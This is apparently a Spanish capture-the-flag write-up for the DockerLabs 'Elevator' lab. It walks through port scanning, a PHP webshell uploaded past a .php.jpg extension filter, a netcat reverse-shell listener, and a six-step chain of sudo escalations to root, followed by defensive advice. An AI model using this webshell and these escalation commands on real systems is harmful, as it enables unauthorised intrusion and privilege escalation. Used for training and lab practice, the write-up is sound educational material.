# Elevator — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** beafn28  
**Fecha de creación:** 01/12/2024  
**Técnicas:** Nmap · Gobuster · File Upload (.php.jpg bypass) · Reverse Shell · Escalada encadenada (env→ash→ruby→lua→gcc→sudo su)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — directorio /themes con archivo.html](#2-enumeración-web--directorio-themes-con-archivohml)
3. [Bypass de extensión — shell.php.jpg](#3-bypass-de-extensión--shellphpjpg)
4. [Reverse Shell](#4-reverse-shell)
5. [Escalada encadenada — 6 usuarios hasta root](#5-escalada-encadenada--6-usuarios-hasta-root)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh elevator.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
```

Solo puerto 80.

---

## 2. Enumeración web — directorio /themes con archivo.html

La web muestra "El Misterio del Ascensor Embrujado" con botón "¡Abre el Ascensor!". No encontramos nada explotable directamente.

Lanzamos Gobuster:

```bash
sudo gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,py,txt -t 100 -k -r
```

La carpeta `/themes` tiene algo raro — lanzamos un segundo escaneo dentro:

```bash
sudo gobuster dir -u http://172.17.0.2/themes \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,py,txt -t 100 -k -r
```

```
/uploads     (Status: 200)
/upload.php  (Status: 200)
/archivo.html (Status: 200)
```

Visitamos `http://172.17.0.2/themes/archivo.html` — formulario que solo acepta `.jpg`.

---

## 3. Bypass de extensión — shell.php.jpg

El servidor valida la extensión pero no el contenido real del archivo. Creamos la webshell:

```php
<?php
system($_GET['cmd']);
?>
```

Guardada como `shell.php` → intentamos subir → rechazado: **"Solo se permiten archivos con la extensión .jpg"**

Renombramos con doble extensión:

```bash
mv shell.php shell.php.jpg
```

Subimos `shell.php.jpg` y la aplicación lo acepta. El servidor web ejecuta el PHP porque la extensión real es `.php` (antes del `.jpg`):

```
El archivo ha sido subido correctamente: uploads/68eaa3fb7a356.jpg
```

Comprobamos RCE:

```
http://172.17.0.2/themes/uploads/68eaa3fb7a356.jpg?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ RCE confirmada.

---

## 4. Reverse Shell

```bash
sudo nc -lvnp 443
```

Payload Bash desde revshells.com → URL-encodeado → shell recibida:

```bash
www-data@3182056aca69:/var/www/html/themes/uploads$
```

---

## 5. Escalada encadenada — 6 usuarios hasta root

Esta máquina tiene una cadena de escalada a través de 6 usuarios, cada uno con un binario sudo diferente. La clave es ejecutar `sudo -l` en cada usuario y aplicar GTFObins.

### www-data → daphne (env/sudo)

```bash
www-data@3182056aca69:/var/www/html/themes/uploads$ sudo -l
User www-data may run the following commands:
    (daphne) NOPASSWD: /usr/bin/env
```

```bash
sudo -u daphne /usr/bin/env /bin/sh
$ whoami
daphne
```

### daphne → vilma (ash/sudo)

```bash
daphne@3182056aca69:/$ sudo -l
User daphne may run the following commands:
    (vilma) NOPASSWD: /usr/bin/ash
```

```bash
sudo -u vilma /usr/bin/ash
$ whoami
vilma
```

### vilma → shaggy (ruby/sudo)

```bash
vilma@3182056aca69:/$ sudo -l
User vilma may run the following commands:
    (shaggy) NOPASSWD: /usr/bin/ruby
```

```bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
$ whoami
shaggy
```

### shaggy → fred (lua/sudo)

```bash
shaggy@3182056aca69:/$ sudo -l
User shaggy may run the following commands:
    (fred) NOPASSWD: /usr/bin/lua
```

```bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
$ whoami
fred
```

### fred → scooby (gcc/sudo)

```bash
fred@3182056aca69:/$ sudo -l
User fred may run the following commands:
    (scooby) NOPASSWD: /usr/bin/gcc
```

```bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
$ whoami
scooby
```

### scooby → root (sudo su)

```bash
scooby@3182056aca69:/$ sudo -l
User scooby may run the following commands:
    (root) NOPASSWD: /usr/bin/sudo
```

```bash
scooby@3182056aca69:/$ sudo /usr/bin/sudo su
root@3182056aca69:/# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **File upload con bypass de doble extensión (.php.jpg)** | `archivo.html` | RCE como www-data |
| **6 usuarios con binarios sudo inseguros encadenados** | Sudoers del sistema | Escalada hasta root |

**Para defenderse:**
- Validar el tipo MIME real del archivo con `finfo_file()` en PHP, no basarse en la extensión.
- La doble extensión `archivo.php.jpg` engaña a filtros simples — validar siempre el último punto.
- Cada binario sudo inseguro es un eslabón. Un solo usuario con `sudo su` sin contraseña da acceso root.
- Revisar todos los sudoers con `grep -r NOPASSWD /etc/sudoers*`.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
